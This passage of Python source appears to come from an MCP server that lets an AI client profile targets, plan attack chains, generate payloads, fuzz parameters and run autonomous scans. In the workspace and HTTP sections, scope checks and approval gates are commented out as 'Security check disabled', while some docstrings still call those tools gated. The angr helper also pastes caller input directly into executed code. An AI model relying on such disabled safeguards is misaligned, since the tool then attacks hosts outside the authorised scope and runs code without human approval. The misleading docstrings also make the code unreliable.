    target: str,
    open_ports: list[int] | None = None,
    services: dict[str, str] | None = None,
    banners: list[str] | None = None,
    subdomains: list[str] | None = None,
) -> dict[str, Any]:
    """
    Profile a target: detect type, technologies, CMS, cloud provider,
    score the attack surface, and determine risk level.
    """
    logger.info(f"🧠 ANALYZING TARGET: {target}")
    svcs: dict[int, str] = {}
    if services:
        for k, v in services.items():
            try: svcs[int(k)] = v
            except ValueError: pass
    profile = _intelligence.build_profile(
        target=target,
        open_ports=open_ports or [],
        services=svcs,
        banners=banners or [],
        subdomains=subdomains or [],
    )
    result = profile.to_dict()
    logger.info(f"✅ TARGET PROFILE: type={profile.target_type.value} | surface={profile.attack_surface} | risk={profile.risk_level.value}")
    return result


@mcp.tool()
async def generate_attack_chain(
    target: str,
    target_type: str = "",
    objective: str = "comprehensive",
    open_ports: list[int] | None = None,
    services: dict[str, str] | None = None,
) -> dict[str, Any]:
    """
    Generate a prioritised, step-by-step attack chain for a target.
    objective: comprehensive | quick | stealth
    target_type: web | network | api | cloud | binary | container (auto-detected if omitted)
    """
    logger.info(f"⚔️  GENERATING ATTACK CHAIN: {target} | objective={objective}")
    tt = None
    if target_type:
        try: tt = TargetType(target_type.lower())
        except ValueError: pass
    svcs: dict[int, str] = {}
    if services:
        for k, v in services.items():
            try: svcs[int(k)] = v
            except ValueError: pass
    profile = _intelligence.build_profile(target=target, open_ports=open_ports or [], services=svcs)
    if tt:
        profile.target_type = tt
    chain = _intelligence.generate_attack_chain(target, tt, objective, profile)
    result = chain.to_dict()
    logger.info(f"✅ ATTACK CHAIN: {len(chain.steps)} steps | success_prob={chain.success_prob:.1%} | time_est={chain.total_time:.0f}s")
    return result


@mcp.tool()
async def optimize_tool_params(
    tool: str,
    target: str,
    open_ports: list[int] | None = None,
    stealth: bool = False,
    aggressive: bool = False,
    quick: bool = False,
) -> dict[str, Any]:
    """
    Get AI-optimized parameters for a specific tool based on target profile.
    Returns recommended flags/options to maximise effectiveness.
    """
    logger.info(f"⚙️  OPTIMIZING PARAMS: {tool} → {target}")
    profile = _intelligence.build_profile(target=target, open_ports=open_ports or [])
    flags = {"stealth": stealth, "aggressive": aggressive, "quick": quick}
    params = _intelligence.optimize_params(tool, profile, flags)
    tools_ranked = _intelligence.select_optimal_tools(profile.target_type, top_n=5)
    result = {
        "tool":            tool,
        "target":          target,
        "target_type":     profile.target_type.value,
        "optimized_params": params,
        "top_tools_for_target": [{"tool": t, "effectiveness": e} for t, e in tools_ranked],
    }
    logger.info(f"✅ PARAMS OPTIMIZED: {tool} | {params}")
    return result


@mcp.tool()
async def get_error_recovery(
    tool: str,
    command: str,
    output: str,
    exit_code: int = 1,
    duration: float = 0.0,
) -> dict[str, Any]:
    """
    Classify a tool error and return recovery strategies, tool alternatives,
    and parameter adjustments to resolve the issue.
    """
    logger.info(f"🔧 ERROR RECOVERY: {tool} | exit_code={exit_code}")
    ctx = _error_handler.classify(tool, command, output, exit_code, duration)
    result = _error_handler.to_dict(ctx)
    # Also provide degradation fallback
    operation = _guess_operation(tool)
    if operation:
        next_tool = _degradation.next_tool(operation, [tool])
        manual = _degradation.get_manual_fallback(operation, command.split()[-1] if command else "")
        result["fallback_tool"] = next_tool
        result["manual_fallback"] = manual
    logger.info(f"✅ RECOVERY: error_type={ctx.error_type.value} | alternatives={ctx.alternatives[:2]}")
    return result


def _guess_operation(tool: str) -> str:
    mapping = {
        "nmap": "port_scan", "masscan": "port_scan", "rustscan": "port_scan",
        "gobuster": "dir_bust", "feroxbuster": "dir_bust", "ffuf": "dir_bust", "dirsearch": "dir_bust",
        "subfinder": "subdomain_enum", "amass": "subdomain_enum",
        "nuclei": "vuln_scan", "nikto": "vuln_scan",
        "katana": "web_crawl", "hakrawler": "web_crawl",
        "hashcat": "password_crack", "john": "password_crack",
        "hydra": "brute_force", "medusa": "brute_force",
        "enum4linux": "smb_enum", "smbmap": "smb_enum",
        "prowler": "cloud_audit", "scout-suite": "cloud_audit",
        "trivy": "container_scan",
        "radare2": "static_analysis", "ghidra": "static_analysis",
        "gdb": "dynamic_analysis", "pwntools": "dynamic_analysis",
        "sqlmap": "sql_injection",
        "dalfox": "xss_scan",
        "arjun": "param_discovery",
    }
    return mapping.get(tool, "")


# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

@mcp.tool()
async def generate_payload(
    vuln_class: str,
    target_tech: str = "",
    context: str = "",
) -> dict[str, Any]:
    """
    Generate contextual security payloads for a vulnerability class.
    vuln_class: rce | sqli | xss | lfi | ssrf | ssti | xxe | cmd_injection |
                open_redirect | path_traversal | file_upload | idor | jwt_attack | deserialization
    """
    logger.info(f"💉 GENERATING PAYLOAD: {vuln_class} | tech={target_tech}")
    payload_set = _payload_gen.generate(vuln_class, target_tech, context)
    result = payload_set.to_dict()
    logger.info(f"✅ PAYLOAD SET: {len(payload_set.payloads)} payloads | risk={payload_set.risk_rating}")
    return result


@mcp.tool()
async def get_upload_bypass_payloads(server_tech: str = "php") -> dict[str, Any]:
    """
    Get file upload bypass techniques and filenames for a given server technology.
    server_tech: php | asp | jsp | generic
    """
    logger.info(f"📁 UPLOAD BYPASS PAYLOADS: tech={server_tech}")
    return _payload_gen.generate_upload_bypass_set(server_tech)


# ============================================================================
# CTF TOOLS
# ============================================================================

@mcp.tool()
async def run_ctf_workflow(
    challenge_name: str,
    category: str,
    target: str = "",
    description: str = "",
    points: int = 0,
    files: list[str] | None = None,
) -> dict[str, Any]:
    """
    Generate a CTF solving strategy and auto-solve plan for a challenge.
    category: web | crypto | pwn | forensics | rev | misc | osint
    """
    logger.info(f"🏁 CTF WORKFLOW: {challenge_name} | category={category}")
    challenge = CTFChallenge(
        name=challenge_name,
        category=category,
        description=description,
        points=points,
        files=files or [],
        url=target,
    )
    strategy = _ctf_manager.create_strategy(challenge)
    auto_plan = _ctf_automator.generate_auto_solve_plan(challenge)
    result = {
        "strategy": _ctf_manager.to_dict(strategy),
        "auto_solve_plan": auto_plan,
    }
    logger.info(f"✅ CTF STRATEGY: {len(strategy.strategies)} strategies | {len(strategy.tools)} tools | est={strategy.time_est}min")
    return result


@mcp.tool()
async def extract_ctf_flags(output: str, challenge_name: str = "") -> dict[str, Any]:
    """Scan tool output for CTF flag patterns and extract all flags found."""
    logger.info(f"🚩 FLAG EXTRACTION: scanning {len(output)} chars")
    result = _ctf_automator.analyze_output_for_flag(output, challenge_name)
    if result["flags_found"]:
        logger.info(f"🎉 FLAGS FOUND: {result['flags_found']}")
    else:
        logger.info(f"ℹ️  No flags found | clues={result['clues']}")
    return result


@mcp.tool()
async def get_ctf_tools(category: str, description: str = "") -> dict[str, Any]:
    """
    Get the recommended tools for a CTF challenge category,
    prioritised by description keywords.
    """
    logger.info(f"🔧 CTF TOOLS: category={category}")
    from core.ctf_manager import CTFToolManager
    mgr = CTFToolManager()
    tools = mgr.suggest_tools(category, description)
    commands = {}
    for tool in tools[:5]:
        cmd = mgr.get_tool_command(tool, "<target>", category)
        if cmd:
            commands[tool] = cmd
    return {
        "category":   category,
        "tools":      tools,
        "commands":   commands,
        "strategies": (list(__import__("core.ctf_manager", fromlist=["CATEGORY_STRATEGIES"]).CATEGORY_STRATEGIES.get(category.lower(), []))[:6]),
    }


# ============================================================================
# BUG BOUNTY TOOLS
# ============================================================================

@mcp.tool()
async def run_bug_bounty_workflow(
    workflow_name: str,
    target: str,
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
    dry_run: bool = False,
) -> dict[str, Any]:
    """
    Run a bug bounty workflow against a target.
    workflow_name: recon | osint | vuln_hunting | file_upload | auth_bypass | business_logic
    dry_run=True returns the plan without executing tools.
    """
    logger.info(f"🎯 BUG BOUNTY WORKFLOW: {workflow_name} → {target}")
    wf = _bug_bounty.get_workflow(workflow_name, target)
    if not wf:
        available = [w["name"] for w in _bug_bounty.list_workflows()]
        return {"error": f"Unknown workflow: {workflow_name}", "available": available}

    if dry_run:
        logger.info(f"📋 DRY RUN: returning plan for {wf.name}")
        return {"dry_run": True, "workflow": wf.to_dict()}

    context, sid = _context_for(target, session_id)
    results = []
    for step in wf.steps:
        if step.priority != "high" and step.condition != "always":
            continue  # skip medium/low priority conditional steps in automated mode
        outcome = await run_kali_tool(
            tool=step.tool,
            target=target,
            options=step.options,
            session_id=sid,
            allow_dangerous=allow_dangerous,
            read_only=read_only,
        )
        results.append({"phase": step.phase, "tool": step.tool, "goal": step.goal, "result": outcome})
        if outcome.get("blocked"):
            continue

    logger.info(f"✅ BUG BOUNTY DONE: {wf.name} | {len(results)} steps")
    return {
        "session_id": sid,
        "workflow": wf.name,
        "target": target,
        "results": results,
        "notes": wf.notes,
    }


@mcp.tool()
async def get_bug_bounty_checklist(target: str) -> dict[str, Any]:
    """
    Return a prioritised high-impact vulnerability checklist for bug bounty,
    ordered by severity/impact rating.
    """
    logger.info(f"📋 BUG BOUNTY CHECKLIST: {target}")
    return _bug_bounty.high_impact_checklist(target)


@mcp.tool()
async def list_bug_bounty_workflows() -> dict[str, Any]:
    """List all available bug bounty workflows with descriptions."""
    return {"workflows": _bug_bounty.list_workflows()}


# ============================================================================
# SMART SCAN (AI-DRIVEN)
# ============================================================================

@mcp.tool()
async def smart_scan(
    target: str,
    objective: str = "comprehensive",
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
    dry_run: bool = False,
) -> dict[str, Any]:
    """
    Compatibility wrapper for the new agentic scanner.

    The old smart_scan used a fixed attack-chain queue. That conflicts with the
    new design, so smart_scan now delegates to autonomous_deep_scan and keeps
    the same external name for Claude/MCP compatibility.
    """
    logger.info(f"🤖 SMART SCAN → AGENTIC DEEP SCAN: {target} | objective={objective}")

    if dry_run:
        context, sid = _context_for(target, session_id)
        from core.deep_scanner import DeepScanner
        scanner = DeepScanner(max_scans=1, max_tool_iterations=1, execution_mode="manual")

        async def _noop(tool: str, target: str, options: str = "", session_id: str = "") -> dict:
            command = _build_command(tool, target, options)
            return {
                "session_id": session_id or sid,
                "blocked": True,
                "status": "dry_run",
                "command": command,
                "output": "",
                "exit_code": None,
            }

        report = await scanner.run(target=target, context=context, execute_tool=_noop, session_id=sid)
        return {
            "dry_run": True,
            "session_id": sid,
            "target": target,
            "planned_workflow": "agentic_single_tool_deep_loop",
            "scan_history": report.scan_history,
            "stop_reason": report.stop_reason,
        }

    # Map old objectives to safe limits while preserving the new workflow.
    max_scans = 8 if objective == "quick" else 18 if objective == "stealth" else 30
    max_tool_iterations = 2 if objective == "quick" else 3 if objective == "stealth" else 4
    return await autonomous_deep_scan(
        target=target,
        session_id=session_id,
        max_scans=max_scans,
        max_tool_iterations=max_tool_iterations,
        execution_mode="automatic",
        allow_dangerous=allow_dangerous,
    )


# ============================================================================
# AUTONOMOUS DEEP SCAN
# ============================================================================

@mcp.tool()
async def autonomous_deep_scan(
    target: str,
    session_id: str = "",
    max_scans: int = 30,
    max_tool_iterations: int = 4,
    execution_mode: str = "automatic",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Agent-driven deep scan using the new single-tool-deep-loop pipeline.

    The scanner separates thinking from acting, selects one tool based on
    evidence, keeps refining that same tool until it is exhausted, then moves
    to the next best tool. It records decision confidence, hypotheses, dead-end
    detection, prioritized findings, an attack map, and vulnerability chains.

    execution_mode: automatic | semi-automatic | manual. Manual mode returns
    the planned command decisions in scan history when commands are blocked by
    policy/approval layers; automatic mode executes within existing Guardian
    safety limits.
    """
    from core.deep_scanner import DeepScanner

    logger.info(f"🤖 AGENTIC DEEP SCAN: {target} | max_scans={max_scans} | max_tool_iterations={max_tool_iterations} | mode={execution_mode}")
    _tty(f"\n{'='*60}")
    _tty(f"🤖 AGENTIC SINGLE-TOOL DEEP SCAN")
    _tty(f"   Target      : {target}")
    _tty(f"   Max scans   : {max_scans}")
    _tty(f"   Tool depth  : {max_tool_iterations}")
    _tty(f"   Mode        : {execution_mode}")
    _tty(f"{'='*60}\n")

    context, sid = _context_for(target, session_id)

    # Initialise Brain for AI-driven analysis if the API key is available
    brain = None
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if api_key:
        from core.brain import Brain
        brain = Brain(api_key=api_key)
        logger.info("🧠 AI analysis enabled")
    else:
        logger.warning("⚠️  ANTHROPIC_API_KEY not set — running without AI analysis")

    scanner = DeepScanner(
        brain=brain,
        max_scans=max_scans,
        max_tool_iterations=max_tool_iterations,
        execution_mode=execution_mode,
    )

    def on_phase(phase: str) -> None:
        label = phase.upper().replace("_", " ")
        _tty(f"\n{'─'*50}")
        _tty(f"📍 PHASE: {label}")
        _tty(f"{'─'*50}")
        logger.info(f"📍 ENTERING PHASE: {phase}")

    async def _execute(tool: str, target: str, options: str = "", session_id: str = "") -> dict:
        mode = execution_mode.lower()
        command = _build_command(tool, target, options)

        if mode == "manual":
            _tty(f"🧠 MANUAL MODE — suggested command only: {command}")
            return {
                "session_id": session_id or sid,
                "success": False,
                "blocked": True,
                "status": "manual_approval_required",
                "reason": "manual mode suggests commands without executing them",
                "command": command,
                "output": "",
                "exit_code": None,
            }

        if mode == "semi-automatic":
            # Pre-assess with Guardian: safe commands run automatically,
            # dangerous ones are surfaced for explicit approval.
            tool_info = get_tool(tool) or {}
            ctx_obj, _ = _context_for(target, session_id or sid)
            guard_decision = Guardian().assess(command, tool, ctx_obj, tool_info.get("dangerous", False))
            if guard_decision.dangerous:
                _tty(f"⏸️  SEMI-AUTO PAUSE — dangerous command requires approval:")
                _tty(f"   {command}")
                return {
                    "session_id": session_id or sid,
                    "success": False,
                    "blocked": True,
                    "status": "pending_approval",
                    "reason": "semi-automatic mode: dangerous command requires explicit approval before execution",
                    "command": command,
                    "output": "",
                    "exit_code": None,
                    "dangerous": True,
                }

        return await run_kali_tool(
            tool=tool,
            target=target,
            options=options,
            session_id=session_id or sid,
            allow_dangerous=allow_dangerous,
            read_only=False,
        )

    report = await scanner.run(
        target=target,
        context=context,
        execute_tool=_execute,
        session_id=sid,
        on_phase=on_phase,
    )

    # Flush all in-memory findings and scan metadata to the session DB so that
    # generate_report() and the report templates can read them.
    sessions.sync_findings(sid, context.findings)
    sessions.save_scan_meta(sid, {
        "vulnerability_chains": report.vulnerability_chains,
        "attack_surface":       report.attack_surface,
        "tool_summaries":       report.tool_summaries,
        "phases_completed":     report.phases_completed,
        "stop_reason":          report.stop_reason,
        "total_scans":          report.total_scans,
        "duration_seconds":     round(report.duration, 1),
        "final_analysis":       report.final_analysis,
    })

    _tty(f"\n{'='*60}")
    _tty(f"✅ AUTONOMOUS DEEP SCAN COMPLETE")
    _tty(f"   Scans      : {report.total_scans}")
    _tty(f"   Iterations : {report.iterations}")
    _tty(f"   Findings   : {report.findings_count}")
    _tty(f"   Vulns      : {len(report.vulnerabilities)}")
    _tty(f"   Duration   : {report.duration:.1f}s")
    _tty(f"{'='*60}\n")

    logger.info(
        f"✅ DEEP SCAN DONE: {report.total_scans} scans | "
        f"{report.findings_count} findings | "
        f"{len(report.vulnerabilities)} vulns | "
        f"{report.duration:.1f}s"
    )

    return {
        "session_id":       sid,
        "target":           report.target,
        "total_scans":      report.total_scans,
        "iterations":       report.iterations,
        "phases_completed": report.phases_completed,
        "findings_count":   report.findings_count,
        "vulnerabilities":  report.vulnerabilities,
        "attack_surface":   report.attack_surface,
        "duration_seconds": round(report.duration, 1),
        "stop_reason":      report.stop_reason,
        "tool_summaries":   report.tool_summaries,
        "vulnerability_chains": report.vulnerability_chains,
        "attack_map":       report.attack_map,
        "scan_history":     report.scan_history,
    }


@mcp.tool()
async def list_workflows_info() -> dict[str, Any]:
    """List all 13 available workflows with names, aliases, and descriptions."""
    return {
        "total": len(ALL_WORKFLOWS),
        "workflows": [
            {
                "name":        wf.name,
                "aliases":     wf.aliases[:4],
                "description": wf.description,
                "steps":       len(wf.steps),
                "aggressive":  getattr(wf, "aggressive", False),
            }
            for wf in ALL_WORKFLOWS
        ],
    }


# ============================================================================
# PROCESS, TASK, CACHE, AND TELEMETRY TOOLS
# ============================================================================

@mcp.tool()
async def start_tool_task(
    tool: str,
    target: str,
    options: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
    use_cache: bool = True,
) -> dict[str, Any]:
    """Start a Kali tool in the background and return a task id for polling."""
    info = _tasks.start(
        label=f"tool:{tool}",
        target=target,
        session_id=session_id,
        coro_factory=lambda: run_kali_tool(
            tool=tool,
            target=target,
            options=options,
            session_id=session_id,
            allow_dangerous=allow_dangerous,
            read_only=read_only,
            use_cache=use_cache,
        ),
    )
    return info.to_dict()


@mcp.tool()
async def start_workflow_task(
    workflow_name: str,
    target: str,
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
) -> dict[str, Any]:
    """Start a ProfLupinMind workflow in the background and return a task id for polling."""
    info = _tasks.start(
        label=f"workflow:{workflow_name}",
        target=target,
        session_id=session_id,
        coro_factory=lambda: run_workflow(
            workflow_name=workflow_name,
            target=target,
            session_id=session_id,
            allow_dangerous=allow_dangerous,
            read_only=read_only,
        ),
    )
    return info.to_dict()


@mcp.tool()
async def list_tasks(include_done: bool = True) -> dict[str, Any]:
    """List background task status records."""
    return {"tasks": _tasks.list(include_done=include_done)}


@mcp.tool()
async def get_task_result(task_id: str) -> dict[str, Any]:
    """Return task status and result when available."""
    return _tasks.get(task_id, include_result=True)


@mcp.tool()
async def cancel_task(task_id: str) -> dict[str, Any]:
    """Cancel a background task."""
    return _tasks.cancel(task_id)


@mcp.tool()
async def list_active_processes(include_finished: bool = False) -> dict[str, Any]:
    """List OS processes launched by ProfLupinMind tool execution."""
    return {"processes": _processes.list(include_finished=include_finished)}


@mcp.tool()
async def get_process_status(pid: int) -> dict[str, Any]:
    """Return detailed status for a process launched by ProfLupinMind."""
    status = _processes.get(pid)
    if status.get("success"):
        status["resource_usage"] = _resources.get_process_usage(pid)
    return status


@mcp.tool()
async def terminate_process(pid: int) -> dict[str, Any]:
    """Terminate a process launched by ProfLupinMind."""
    return _processes.signal(pid, signal.SIGTERM)


@mcp.tool()
async def terminate_process_gracefully(pid: int, timeout: float = 5.0) -> dict[str, Any]:
    """Terminate a ProfLupinMind-launched process with SIGTERM, then SIGKILL after timeout."""
    return await _processes.terminate_gracefully(pid, timeout=max(0.1, min(timeout, 30.0)))


@mcp.tool()
async def pause_process(pid: int) -> dict[str, Any]:
    """Pause a process launched by ProfLupinMind using SIGSTOP."""
    return _processes.signal(pid, signal.SIGSTOP)


@mcp.tool()
async def resume_process(pid: int) -> dict[str, Any]:
    """Resume a paused process launched by ProfLupinMind using SIGCONT."""
    return _processes.signal(pid, signal.SIGCONT)


@mcp.tool()
async def get_cache_stats() -> dict[str, Any]:
    """Return command cache statistics."""
    return _cache.stats()


@mcp.tool()
async def clear_command_cache() -> dict[str, Any]:
    """Clear the command result cache."""
    return {"success": True, "cleared": _cache.clear()}


@mcp.tool()
async def get_telemetry() -> dict[str, Any]:
    """Return ProfLupinMind runtime telemetry and command success metrics."""
    return {
        "telemetry": _telemetry.stats(),
        "cache": _cache.stats(),
        "resources": _resources.get_current_usage(),
        "performance": _performance.get_summary(),
    }


@mcp.tool()
async def get_resource_usage() -> dict[str, Any]:
    """Return current system resource usage and short trend history."""
    return {
        "success": True,
        "current_usage": _resources.get_current_usage(),
        "usage_trends": _resources.get_usage_trends(),
    }


@mcp.tool()
async def get_performance_dashboard() -> dict[str, Any]:
    """Return HexStrike-style runtime dashboard data for ProfLupinMind executions."""
    resource_usage = _resources.get_current_usage()
    cache_stats = _cache.stats()
    dashboard = {
        "performance_summary": _performance.get_summary(),
        "tasks": {
            "active": _tasks.list(include_done=False),
            "all_recent": _tasks.list(include_done=True)[:20],
        },
        "processes": {
            "active": _processes.list(include_finished=False),
            "recent": _processes.list(include_finished=True)[:20],
        },
        "resource_usage": resource_usage,
        "cache_stats": cache_stats,
        "system_health": {
            "cpu_status": "healthy" if resource_usage["cpu_percent"] < 80 else "warning" if resource_usage["cpu_percent"] < 95 else "critical",
            "memory_status": "healthy" if resource_usage["memory_percent"] < 85 else "warning" if resource_usage["memory_percent"] < 95 else "critical",
            "disk_status": "healthy" if resource_usage["disk_percent"] < 90 else "warning" if resource_usage["disk_percent"] < 98 else "critical",
        },
    }
    return {"success": True, "dashboard": dashboard}


@mcp.tool()
async def get_runtime_health() -> dict[str, Any]:
    """Return a scored runtime health report with issues and recommendations."""
    return {"success": True, "health_report": _runtime_health.report()}


# ============================================================================
# SAFE WORKSPACE AND PYTHON TOOLS
# ============================================================================

@mcp.tool()
async def workspace_write(path: str, content: str, append: bool = False) -> dict[str, Any]:
    """Write a text file under the safe ProfLupinMind workspace at /tmp/proflupinmind_files."""
    try:
        return _workspace.write(path, content, append=append)
    except ValueError as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def workspace_read(path: str, max_bytes: int = 20000) -> dict[str, Any]:
    """Read a text file under the safe ProfLupinMind workspace."""
    try:
        return _workspace.read(path, max_bytes=max_bytes)
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def workspace_list(path: str = ".") -> dict[str, Any]:
    """List files under the safe ProfLupinMind workspace."""
    try:
        return _workspace.list(path)
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def workspace_delete(path: str, allow_dangerous: bool = False) -> dict[str, Any]:
    """Delete a single file under the safe ProfLupinMind workspace."""
    # Security check disabled
    # if not allow_dangerous:
    #     return {"success": False, "blocked": True, "reason": "file deletion requires allow_dangerous=true"}
    try:
        return _workspace.delete(path)
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def execute_python_script(
    script: str,
    filename: str = "script.py",
    allow_dangerous: bool = False,
    timeout: int = 30,
) -> dict[str, Any]:
    """
    Execute a Python script from the safe workspace.
    This is intentionally gated because it is local code execution.
    """
    # Security check disabled
    # if not allow_dangerous:
    #     return {"success": False, "blocked": True, "reason": "python execution requires allow_dangerous=true"}
    if not filename.endswith(".py"):
        filename = f"{filename}.py"
    written = _workspace.write(filename, script, append=False)
    if not written.get("success"):
        return written
    script_path = written["path"]
    started = time.time()
    result = subprocess.run(
        [sys.executable, script_path],
        capture_output=True,
        text=True,
        timeout=max(1, min(timeout, 120)),
        check=False,
    )
    return {
        "success": result.returncode == 0,
        "path": script_path,
        "exit_code": result.returncode,
        "duration": round(time.time() - started, 3),
        "stdout": result.stdout[:8000],
        "stderr": result.stderr[:8000],
    }


@mcp.tool()
async def install_python_package(package: str, allow_dangerous: bool = False, timeout: int = 120) -> dict[str, Any]:
    """Install a Python package into the active environment. Gated because it changes local state."""
    # Security check disabled
    # if not allow_dangerous:
    #     return {"success": False, "blocked": True, "reason": "package installation requires allow_dangerous=true"}
    if not re.fullmatch(r"[A-Za-z0-9_.-]+(?:==[A-Za-z0-9_.!+-]+)?", package):
        return {"success": False, "error": "package name/version contains unsupported characters"}
    result = subprocess.run(
        [sys.executable, "-m", "pip", "install", package],
        capture_output=True,
        text=True,
        timeout=max(10, min(timeout, 300)),
        check=False,
    )
    return {
        "success": result.returncode == 0,
        "package": package,
        "exit_code": result.returncode,
        "stdout": result.stdout[-8000:],
        "stderr": result.stderr[-8000:],
    }


# ============================================================================
# HTTP, BROWSER-LIKE INSPECTION, AND REPORT HELPERS
# ============================================================================

@mcp.tool()
async def http_request_readonly(
    url: str,
    method: str = "GET",
    session_id: str = "",
    timeout: float = 15.0,
) -> dict[str, Any]:
    """Run a read-only HTTP request and summarize links, forms, headers, and security signals."""
    context, _sid = _context_for(url, session_id)
    # Security check disabled
    # if not is_in_scope(url, context.scope):
    #     return {"success": False, "blocked": True, "reason": "URL is outside the locked scope"}
    try:
        return http_request(url, method=method, timeout=timeout)
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def crawl_site_readonly(
    url: str,
    max_pages: int = 25,
    max_depth: int = 2,
    session_id: str = "",
) -> dict[str, Any]:
    """Crawl same-origin links with read-only GET requests."""
    context, _sid = _context_for(url, session_id)
    # Security check disabled
    # if not is_in_scope(url, context.scope):
    #     return {"success": False, "blocked": True, "reason": "URL is outside the locked scope"}
    try:
        return crawl_site(url, max_pages=max(1, min(max_pages, 100)), max_depth=max(0, min(max_depth, 5)))
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def browser_inspect_readonly(url: str, session_id: str = "") -> dict[str, Any]:
    """Perform static browser-like page inspection without JavaScript execution."""
    context, _sid = _context_for(url, session_id)
    # Security check disabled
    # if not is_in_scope(url, context.scope):
    #     return {"success": False, "blocked": True, "reason": "URL is outside the locked scope"}
    try:
        return http_browser_inspect(url)
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def http_intruder_readonly(
    url: str,
    payloads: list[str],
    parameter: str = "q",
    max_requests: int = 25,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """Run a small GET-only sniper-style parameter test."""
    # Security checks disabled
    # if not allow_dangerous:
    #     return {"success": False, "blocked": True, "reason": "parameter fuzzing requires allow_dangerous=true"}
    context, _sid = _context_for(url, session_id)
    # if not is_in_scope(url, context.scope):
    #     return {"success": False, "blocked": True, "reason": "URL is outside the locked scope"}
    # Be resilient to older clients that may omit or send an empty parameter.
    param_name = (parameter or "").strip() or "q"
    try:
        return intruder_sniper(url, param_name, payloads, max_requests=max(1, min(max_requests, 50)))
    except Exception as exc:
        return {"success": False, "error": str(exc)}


@mcp.tool()
async def create_vulnerability_report(
    vulnerabilities_json: str,
    target: str = "",
    scan_type: str = "manual",
) -> dict[str, Any]:
    """Create a Markdown vulnerability summary in the safe workspace from JSON findings."""
    try:
        vulnerabilities = json.loads(vulnerabilities_json)
    except json.JSONDecodeError as exc:
        return {"success": False, "error": f"invalid JSON: {exc}"}
    if not isinstance(vulnerabilities, list):
        return {"success": False, "error": "vulnerabilities_json must be a JSON list"}
    lines = [f"# Vulnerability Summary: {target or 'Unknown Target'}", "", f"Scan type: {scan_type}", ""]
    counts: dict[str, int] = {}
    for vuln in vulnerabilities:
        sev = str(vuln.get("severity", "INFO")).upper()
        counts[sev] = counts.get(sev, 0) + 1
    lines.append("## Severity Counts")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in counts:
            lines.append(f"- {sev}: {counts[sev]}")
    lines.append("")
    lines.append("## Findings")
    for idx, vuln in enumerate(vulnerabilities, 1):
        title = vuln.get("title") or vuln.get("type") or f"Finding {idx}"
        detail = vuln.get("detail") or vuln.get("description") or ""
        lines.extend([f"### {idx}. {title}", f"- Severity: {vuln.get('severity', 'INFO')}", f"- Detail: {detail}", ""])
    path = f"vulnerability-report-{int(time.time())}.md"
    written = _workspace.write(path, "\n".join(lines))
    return {"success": True, "report": written, "severity_counts": counts}


# ============================================================================
# BINARY / REVERSE ENGINEERING TOOLS
# ============================================================================

@mcp.tool()
async def ghidra_analysis(
    binary_path: str,
    project_name: str = "proflupinmind_project",
    analyze: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """NSA Ghidra reverse engineering — disassemble, decompile, and analyze binaries."""
    logger.info(f"🔬 GHIDRA: {binary_path}")
    options = f"--project {project_name}" if project_name else ""
    return await run_kali_tool(tool="ghidra", target=binary_path, options=options, session_id=session_id)


@mcp.tool()
async def radare2_analyze(
    binary_path: str,
    command: str = "aaa",
    extra_flags: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Radare2 binary analysis — disassemble, debug, and patch binaries.
    command: aaa (full analysis) | afl (list functions) | pdf @ main (disassemble main) | iz (strings)
    """
    logger.info(f"🔍 RADARE2: {binary_path} | cmd={command}")
    options = f"-q -c '{command}' {extra_flags}".strip()
    return await run_kali_tool(tool="radare2", target=binary_path, options=options, session_id=session_id)


@mcp.tool()
async def gdb_analyze(
    binary_path: str,
    commands: str = "info functions\ninfo security\nquit",
    use_peda: bool = False,
    args: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    GDB debugger — analyze binaries, read memory, find vulnerabilities.
    commands: newline-separated GDB commands to run in batch mode.
    use_peda: enable PEDA (Python Exploit Development Assistance) plugin.
    """
    logger.info(f"🐛 GDB: {binary_path} | peda={use_peda}")
    peda_flag = "-ex 'source /usr/share/peda/peda.py'" if use_peda else ""
    batch_cmds = " ".join(f"-ex '{c.strip()}'" for c in commands.splitlines() if c.strip())
    options = f"-batch {peda_flag} {batch_cmds} {args}".strip()
    return await run_kali_tool(tool="gdb", target=binary_path, options=options, session_id=session_id)


@mcp.tool()
async def angr_symbolic_execution(
    binary_path: str,
    find_addr: str = "",
    avoid_addr: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Angr symbolic execution — automatically find input to reach/avoid addresses.
    find_addr: hex address to reach (e.g. '0x401337')
    avoid_addr: hex address to avoid (e.g. '0x401400')
    """
    logger.info(f"⚡ ANGR: {binary_path} | find={find_addr} | avoid={avoid_addr}")
    script = f"""
import angr, sys
p = angr.Project('{binary_path}', auto_load_libs=False)
state = p.factory.entry_state()
sm = p.factory.simulation_manager(state)
find = [{find_addr}] if '{find_addr}' else []
avoid = [{avoid_addr}] if '{avoid_addr}' else []
if find:
    sm.explore(find=find, avoid=avoid)
    if sm.found:
        s = sm.found[0]
        print('FOUND:', s.posix.dumps(0))
    else:
        print('No path found to target address')
else:
    sm.run(n=100)
    print('Deadended states:', len(sm.deadended))
    print('Active states:', len(sm.active))
    for s in sm.deadended[:3]:
        print('Input:', s.posix.dumps(0)[:200])
"""
    written = _workspace.write("angr_script.py", script.strip())
    if not written.get("success"):
        return written
    result = await execute_python_script(script=script.strip(), filename="angr_analysis.py", allow_dangerous=True, timeout=60)
    logger.info(f"✅ ANGR DONE: {binary_path}")
    return result


@mcp.tool()
